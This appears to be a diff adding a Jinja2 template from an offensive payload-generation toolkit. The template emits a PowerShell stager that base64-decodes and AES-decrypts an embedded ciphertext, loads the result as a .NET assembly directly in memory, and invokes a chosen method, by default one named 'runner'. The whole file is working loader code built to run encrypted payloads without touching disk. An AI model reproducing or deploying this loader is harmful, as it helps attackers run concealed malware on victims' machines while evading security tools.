@@ -1,0 +1,23 @@
+{# load-asm.jinja #}
+{#
+    This Jinja2 template includes a PowerShell script
+    that loads COFF images (e,g. .DLLs) to memory.
+#}
+$base64EncData = "{{ ciphertext }}"
+{# Perform base64 decoding #}
+{% include "powershell/decode/base64.jinja" %}
+{# Perform decryption #}
+{% include "powershell/decrypt/aes-dotnet.jinja" %}
+
+$asm = [System.Reflection.Assembly]::Load($data)
+{% if args.type is defined %}
+$class = $asm.GetType("{{args.type}}")
+{% else %}
+$class = $asm.GetType("ClassLibrary.Class")
+{% endif %}
+{% if args.method is defined %}
+$method = $class.GetMethod(args.method)
+{% else %} 
+$method = $class.GetMethod("runner")
+{% endif %}
+$method.Invoke(0, $null)
